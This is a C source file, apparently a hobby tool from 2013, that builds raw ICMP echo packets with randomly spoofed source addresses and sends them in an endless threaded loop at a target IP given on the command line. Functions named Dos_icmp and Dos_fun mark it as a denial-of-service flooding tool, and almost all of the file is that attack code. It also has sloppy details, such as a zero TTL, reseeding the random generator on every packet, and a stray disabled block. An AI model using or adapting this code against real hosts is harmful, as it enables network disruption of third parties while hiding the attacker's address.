/*date: 2013-10-26
 *author: shenya
	*/
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <signal.h>
#include <pthread.h>

uint8_t *hostname = NULL;
static unsigned long dest = 0;
static int rawsock;
int alive = 1;

int32_t icmp_cksum(void *data, int length)
{
	int left = length;
	uint16_t *wd = (uint16_t *)data;
	int sum = 0;
	uint16_t temp;

	while(left > 1)
	{
		sum += *wd++;
		left -= 2;
	}
	if(left == 1)
	{
		*((uint8_t *)(&temp)) = *((uint8_t *)wd);
		sum += temp;
	}

	sum = (sum >> 16) + (sum&0xffff);
	sum += (sum >> 16);

	temp = ~sum;

	return temp;
}

static long int ip_random(void)
{
	long int random_ip;
	
	srand(time(0));

	random_ip = random();

	return random_ip;
}

static void Dos_icmp(void)
{
	struct sockaddr_in to;
	struct in_addr addr_temp;

	struct ip *iph;
	struct icmp *icmph;
	char *packet;
	int pktsize = sizeof(struct ip) + sizeof(struct icmp) +64;

	packet = malloc(pktsize);

	iph = (struct ip *)packet;
	icmph = (struct icmp *)(packet + sizeof(struct ip));

	memset(packet, 0, pktsize);

	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pktsize);
	iph->ip_id = htons(getpid());

	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = IPPROTO_ICMP;
	iph->ip_sum = 0;
	addr_temp.s_addr = ip_random();
	iph->ip_src = addr_temp;
	addr_temp.s_addr = dest;
	iph->ip_dst = addr_temp;
	
	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;

	icmph->icmp_cksum = htons(~(ICMP_ECHO << 8));

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = htons(0);

	sendto(rawsock, packet, pktsize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));

	free(packet);

}

static void *
Dos_fun(void *arg)
{
	while(alive)
	{
					Dos_icmp();
	}
}


int main(int argc, char *argv[])
{
	struct hostent *host = NULL;
	struct protoent *protocol = NULL;		
	char protoname[] = "icmp";
	pthread_t tid;

	if(argc < 2)
	{
		printf("ping aaa.bbb.ccc.ddd\n");
		exit(1);
	}
	protocol = getprotobyname(protoname);
	if(protocol == NULL)
	{
		printf("fail: not support icmp\n");
		exit(1);
	}

	memset(&dest, 0, sizeof(dest));
	hostname = argv[1];

	dest = inet_addr(hostname);
#if 0
	else
	{

		host = gethostbyname(hostname);
		if(host == NULL)
		{
			printf("fail to gthostbyname");
			exit(1);
		}
		
	//	printf("addr is %s\n", inet_ntoa(*((struct in_addr *)host->h_addr)));
		memcpy((char *)&dest.sin_addr, host->h_addr, host->h_length);
		memcpy(dest_str, inet_ntoa(*((struct in_addr *)host->h_addr)), strlen(inet_ntoa(*((struct in_addr *)host->h_addr))));
#endif
	
	rawsock = socket(AF_INET, SOCK_RAW, protocol->p_proto);
	if(rawsock < 0)
	{
		perror("fail to socket");
		exit(1);
	}

	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	
	pthread_create(&tid, NULL, Dos_fun, NULL);
	Dos_icmp();

	
	while(1);
	return 0;
}
